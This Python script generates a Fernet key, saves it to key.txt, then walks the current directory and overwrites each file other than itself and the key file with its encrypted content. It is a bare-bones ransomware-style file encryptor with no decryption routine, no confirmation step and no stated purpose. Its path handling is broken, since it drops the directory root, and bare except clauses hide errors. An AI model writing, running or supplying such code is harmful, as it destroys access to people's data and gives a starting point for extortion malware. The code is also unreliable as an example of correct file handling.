from cryptography.fernet import Fernet
import sys
import os

def encrypt():
    try:
        encryption_key = Fernet.generate_key()
        cipher = Fernet(encryption_key)

        key_file = open('key.txt', 'wb')

        key_file.write(encryption_key)

        for root, dirs, files in os.walk('.'):
            for file in files:
                file_name = os.path.join(file)

                if file_name != f'{sys.argv[0]}' and file_name != 'key.txt':
                    with open(file_name, 'rb') as r:
                        file_content = r.read()
                        encrypted_file_content = cipher.encrypt(file_content)

                    with open(file_name, 'wb') as w:
                        w.write(encrypted_file_content)
                        print(f'{file_name} encrypted')
                else:
                    pass
    except:
        print('Error encrypting')

def main():
    try:
        encrypt()
    except:
        print(f'Usage: {sys.argv[0]}')
    

if __name__ == '__main__':
    main()
